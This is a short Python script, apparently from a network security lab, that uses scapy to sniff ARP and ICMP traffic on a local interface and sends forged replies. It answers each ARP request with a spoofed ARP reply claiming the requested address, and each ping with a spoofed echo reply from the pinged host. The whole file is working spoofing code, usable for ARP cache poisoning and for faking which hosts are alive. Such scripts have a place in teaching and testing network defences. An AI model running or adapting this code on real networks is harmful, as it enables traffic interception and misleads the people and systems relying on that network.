from scapy.all import *

#define my ip       
my_ip = "192.168.56.4"  
def arp_reply(pkt):
    #check if the sniffed pkt is arp request and its not me
    if pkt[ARP].op==1 and pkt[ARP].psrc != my_ip:
        print("[+] got an ARP request src ip: {0}  dest ip: {1}".format(pkt[ARP].psrc,pkt[ARP].pdst))
        ans = ARP(op=2, pdst = pkt[ARP].psrc , hwdst = pkt[ARP].hwsrc, psrc = pkt[ARP].pdst)
        send(ans, verbose=0)
        print("[+] sent 1 spoofed ARP pkt")
        print("-"*60)


def icmp_reply(pkt):
    if pkt[ICMP].type==8:#check if it is an echo request icmp
        o_src=pkt[IP].src
        o_dst=pkt[IP].dst
        print("[+] got an ICMP request src ip: {0}  dest ip: {1}".format(o_src,o_dst))
        ip=IP(src=o_dst, dst=o_src,ihl=pkt[IP].ihl,ttl=44)
        icmp=ICMP(type=0,id=pkt[ICMP].id,seq=pkt[ICMP].seq)#id and sequnce number has to match
        data=pkt.load
        send(ip/icmp/data, verbose=0)
        print("[+] sent 1 spoofed ICMP pkt")
        print("-"*60)


def echo_reply(pkt):
    if ARP in pkt:
        arp_reply(pkt)	
    elif ICMP in pkt:
        icmp_reply(pkt)
#define interfae 
inter='enp0s3'     
print("[+] starting to sniff on " +inter )        
pkt=sniff(iface=inter, filter= "icmp or arp" , prn=echo_reply)
